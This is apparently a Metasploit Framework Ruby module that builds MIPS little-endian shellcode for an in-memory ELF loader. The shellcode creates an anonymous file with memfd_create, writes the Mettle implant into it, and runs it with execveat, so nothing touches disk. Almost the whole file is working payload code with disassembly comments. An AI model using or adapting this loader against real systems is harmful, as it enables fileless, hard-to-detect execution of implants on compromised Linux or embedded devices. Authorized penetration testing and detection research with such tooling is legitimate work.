#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Diego Ledda <diego_ledda[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
# MIPS conventions
#  Literal Zero: r0/$zero
#  Volatile: t0-t7
#  Parameters: a0-a3
#  Syscall offset: v0
#  Return Address: ra
#
module Msf::Payload::Linux::Mipsle::ElfLoader
  def in_memory_load(payload)
    size = payload.length
    size_h = size >> 16
    size_l = size & 0x0000ffff
    in_memory_loader = [
      # "call" 0x1004, address of the next instruction is stored in $ra
      0x04110000, # 0x1000:	bal	0x1004	0x04110000
      0x00000000, # 0x1004:	nop		0x00000000

      # fd = memfd_create(NULL,MFD_CLOEXEC)
      0x27ff0060, # 0x1008:	addiu	$ra, $ra, 0x60	0x27ff0060
      0xafa0fffc, # 0x100c:	sw	$zero, -4($sp)	0xafa0fffc
      0x27bdfffc, # 0x1010:	addiu	$sp, $sp, -4	0x27bdfffc
      0x03a02020, # 0x1014:	add	$a0, $sp, $zero	0x03a02020
      0x2419fffe, # 0x1018:	addiu	$t9, $zero, -2	0x2419fffe
      0x03202827, # 0x101c:	not	$a1, $t9	0x03202827
      0x24021102, # 0x1020:	addiu	$v0, $zero, 0x1102	0x24021102
      0x0101010c, # 0x1024:	syscall	0x40404	0x0101010c

      # write(fd, payload length, payload pointer)
      0x03e02825, # 0x1028:	move	$a1, $ra	0x03e02825
      (0x3c06 << 16 | size_h), # lui     a2,0x17
      (0x34c6 << 16 | size_l), # ori     a2,a2,0x2fb8
      0x00402025, # 0x1034:	move	$a0, $v0	0x00402025
      0x0080c825, # 0x1038:	move	$t9, $a0	0x0080c825
      0x24020fa4, # 0x103c:	addiu	$v0, $zero, 0xfa4	0x24020fa4
      0x0101010c, # 0x1040:	syscall	0x40404	0x0101010c

      # execveat(fd, null,null,null, AT_EMPTY_PATH)
      0xafa0fffc, # 0x1044:	sw	$zero, -4($sp)	0xafa0fffc
      0x27bdfffc, # 0x1048:	addiu	$sp, $sp, -4	0x27bdfffc
      0x03a02820, # 0x104c:	add	$a1, $sp, $zero	0x03a02820
      0x00003025, # 0x1050:	move	$a2, $zero	0x00003025
      0x00003825, # 0x1054:	move	$a3, $zero	0x00003825
      0x24191000, # 0x1058:	addiu	$t9, $zero, 0x1000	0x24191000
      0xafb90010, # 0x105c:	sw	$t9, 0x10($sp)	0xafb90010
      0x24021104, # 0x1060:	addiu	$v0, $zero, 0x1104	0x24021104
      0x0101010c, # 0x1064:	syscall	0x40404	0x0101010c
    ].pack('V*')
    in_memory_loader
  end
end
